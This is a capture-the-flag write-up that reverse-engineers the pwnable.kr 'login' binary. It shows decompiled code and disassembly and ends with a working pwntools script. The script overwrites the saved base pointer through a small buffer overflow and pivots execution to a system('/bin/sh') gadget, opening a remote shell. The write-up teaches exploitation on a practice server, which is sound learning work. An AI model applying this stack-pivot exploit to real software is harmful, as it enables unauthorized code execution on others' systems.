When exploiting a binary I always like to first play around with it
to get a general idea of what I am dealing with.
(Whether you run it on the server or in a VM it doesn't matter
just please don't run random binaries outside an isolated environment):

```
❯ nc pwnable.kr 9003
Authenticate : secret_key
hash : f88e77140e9e6d52cb34c1c1f6a61869
```

Ok, so, at first glance we can surmise that the program hashes a password and outputs the hash on the screen.
Now let's start with the actual analysis:

```
❯ file slogin
slogin: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=e09ec7145440153c4b3dedc3c7a8e328d9be6b55, not stripped
```

We are working with a 32-bit **statically linked** binary.
Let's decompile the main function (using Ghidra, IDA,or whatever software you prefer really)
and see what it does:

```
int main(void)

{
  void *decoded_str;
  char buf [30];
  uint decoded_len;

  memset(buf,0,0x1e);
  setvbuf((FILE *)stdout,(char *)0x0,2,0);
  setvbuf((FILE *)stdin,(char *)0x0,1,0);
  printf("Authenticate : ");
  __isoc99_scanf(&DAT_080da6b5,buf);
  memset(&input,0,0xc);
  decoded_str = (void *)0x0;
  decoded_len = Base64Decode(buf,&decoded_str);
  if (decoded_len < 0xd) {
    memcpy(&input,decoded_str,decoded_len);
    if (auth(decoded_len) == 1) {
      correct();
    }
  }
  else {
    puts("Wrong Length");
  }
  return 0;
}
```
I renamed the variables to make it look clearer.
Since the `scanf` function deals with input it immediatelly struck me as a potential target.
Unfortunately dereferencing the address of the format string (`0x080da6b5`) in GDB yields: `"%30s"`.
This means that `scanf` will take up to 30 bytes of input which is the exact size of the buffer we pass it,
thus we can not take advantage of a buffer overflow here.

Geting back to the rest of the code we notice the `Base64Decode` function that was also present in the md5 calculator challenge.
It signals that our input is assumed to be encoded in Base64. Additionally, to get pass the `if` statement
we would also need the decoded input to be at most 12 bytes in length.
Now let's look at `auth`.
```
bool auth(size_t len)

{
  char buf1 [8];
  char *hash;
  char buf2 [8];

  memcpy(buf2,&input,len);
  hash = (char *)calc_md5(buf1,0xc);
  printf("hash : %s\n",hash);
  return strcmp("f87cd601aa7fedca99018a8be88eda34",hash) == 0;
}
```

We copy the decoded input into `buf2` (red flag: the decoded input can be up to 12 bytes long).
Then we hash the uninitialized `buf1` passing an invalid length argument?

When I first observed this I decided to run a little experiment to see whether the program was really
not hashing the user input:

```
❯ nc pwnable.kr 9003
Authenticate : AAAA
hash : 7968e02c61740a950a91500784fc81a1


❯ nc pwnable.kr 9003
Authenticate : AAAA
hash : 92308a678245d143ee332311edaeb300
```

As you can see this indeed is the case since it prints different hashes for the same input.
To understand and exploit the apparent bug in the `auth` function we should look at the disassembly:

```
❯ objdump --disassemble=auth -Mintel slogin

0804929c <auth>:
 804929c:	55                   	push   ebp
 804929d:	89 e5                	mov    ebp,esp
 804929f:	83 ec 28             	sub    esp,0x28
 80492a2:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]
 80492a5:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 80492a9:	c7 44 24 04 40 eb 11 	mov    DWORD PTR [esp+0x4],0x811eb40
 80492b0:	08
 80492b1:	8d 45 ec             	lea    eax,[ebp-0x14]
 80492b4:	83 c0 0c             	add    eax,0xc
 80492b7:	89 04 24             	mov    DWORD PTR [esp],eax
 80492ba:	e8 a1 03 02 00       	call   8069660 <memcpy>
 80492bf:	c7 44 24 04 0c 00 00 	mov    DWORD PTR [esp+0x4],0xc
 80492c6:	00
 80492c7:	8d 45 ec             	lea    eax,[ebp-0x14]
 80492ca:	89 04 24             	mov    DWORD PTR [esp],eax
 80492cd:	e8 b6 fe ff ff       	call   8049188 <calc_md5>
 80492d2:	89 45 f4             	mov    DWORD PTR [ebp-0xc],eax
 80492d5:	8b 45 f4             	mov    eax,DWORD PTR [ebp-0xc]
 80492d8:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 80492dc:	c7 04 24 77 a6 0d 08 	mov    DWORD PTR [esp],0x80da677
 80492e3:	e8 48 23 01 00       	call   805b630 <_IO_printf>
 80492e8:	8b 45 f4             	mov    eax,DWORD PTR [ebp-0xc]
 80492eb:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 80492ef:	c7 04 24 84 a6 0d 08 	mov    DWORD PTR [esp],0x80da684
 80492f6:	e8 f5 ef ff ff       	call   80482f0 <.plt+0xf0>
 80492fb:	85 c0                	test   eax,eax
 80492fd:	75 07                	jne    8049306 <auth+0x6a>
 80492ff:	b8 01 00 00 00       	mov    eax,0x1
 8049304:	eb 05                	jmp    804930b <auth+0x6f>
 8049306:	b8 00 00 00 00       	mov    eax,0x0
 804930b:	c9                   	leave
 804930c:	c3                   	ret
```
Observe that the pointer we pass to `memcpy` is actually `$ebp-0x14+0xc = $ebp-8`.
Given that the decoded input can be up to 12 bytes in length this means
we can overwrite the address holding the old base pointer.
Considering that the instruction pointer is fetched from the dereferenced `$ebp + 4`
we can find a target for `$eip` and overwrite the old base pointer to point four bytes before the address of that target like so:

```
decoded_input:
b'AAAA' + addr_of(malicious_code) + addr_of(decoded_input)
```

This assures that after we pop into `$ebp` twice(via the `ret` instruction) execution will continue
in `malicious_code`. What's left to figure out is what the malicious code will be?
We could directly jump to `system` but this would be tricky since `system` requires a string pointer as an argument
(which means we have to assure that a pointer to such string is stored at `$esp+4` when we return to `system`,
in other words this is highly unpleasent bussiness).
Instead we notice that in the `correct` function we already have a gadget which sets up `'/bin/sh'` as an argument
and calls system. We can simply jump to that gadget.

```
void correct(void)

{
  if (input == -0x21524111) {
    puts("Congratulation! you are good!");
    system("/bin/sh");
  }
  exit(0);
}

0804925f <correct>:
 804925f:	55                   	push   ebp
 8049260:	89 e5                	mov    ebp,esp
 8049262:	83 ec 28             	sub    esp,0x28
 8049265:	c7 45 f4 40 eb 11 08 	mov    DWORD PTR [ebp-0xc],0x811eb40
 804926c:	8b 45 f4             	mov    eax,DWORD PTR [ebp-0xc]
 804926f:	8b 00                	mov    eax,DWORD PTR [eax]
 8049271:	3d ef be ad de       	cmp    eax,0xdeadbeef
 8049276:	75 18                	jne    8049290 <correct+0x31>
 8049278:	c7 04 24 51 a6 0d 08 	mov    DWORD PTR [esp],0x80da651
 804927f:	e8 4c 30 01 00       	call   805c2d0 <_IO_puts>
 8049284:	c7 04 24 6f a6 0d 08 	mov    DWORD PTR [esp],0x80da66f  <--- here is the gadget.
 804928b:	e8 20 20 01 00       	call   805b2b0 <__libc_system>
 8049290:	c7 04 24 00 00 00 00 	mov    DWORD PTR [esp],0x0
 8049297:	e8 04 14 01 00       	call   805a6a0 <exit>
```

This leaves us with the final exploit:

```
from pwn import *

elf = ELF('./slogin')
decoded_input = elf.symbols['input']
system_gadget = 0x8049284

payload = b64e(b'junk' + p32(system_gadget) + p32(decoded_input))
proc = remote('pwnable.kr', port=9003)
proc.sendline(payload)
proc.interactive()
proc.close()
```
